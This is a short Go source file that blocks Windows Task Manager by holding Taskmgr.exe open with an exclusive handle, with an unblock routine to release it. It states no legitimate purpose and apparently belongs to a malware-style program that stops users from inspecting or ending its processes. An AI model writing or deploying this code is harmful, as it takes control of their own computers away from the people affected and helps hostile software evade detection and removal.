package main

import (
	"syscall"
	"unsafe"
)

type taskmgrBlocker struct {
	handle uintptr
}

func newBlocker() *taskmgrBlocker {
	return &taskmgrBlocker{}
}

func (b *taskmgrBlocker) block() {
	if b.handle != 0 {
		return
	}
	path, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\Taskmgr.exe`)
	h, _, err := pCreateFileW.Call(
		uintptr(unsafe.Pointer(path)),
		GENERIC_READ,
		0,
		0,
		OPEN_EXISTING,
		0x80,
		0,
	)
	if h != ^uintptr(0) {
		b.handle = h
		logMsg("taskmgr blocked: handle=0x%X", h)
	} else {
		logMsg("taskmgr block failed (not admin?): %v", err)
	}
}

func (b *taskmgrBlocker) unblock() {
	if b.handle != 0 {
		pCloseHandle.Call(b.handle)
		b.handle = 0
		logMsg("taskmgr unblocked")
	}
}
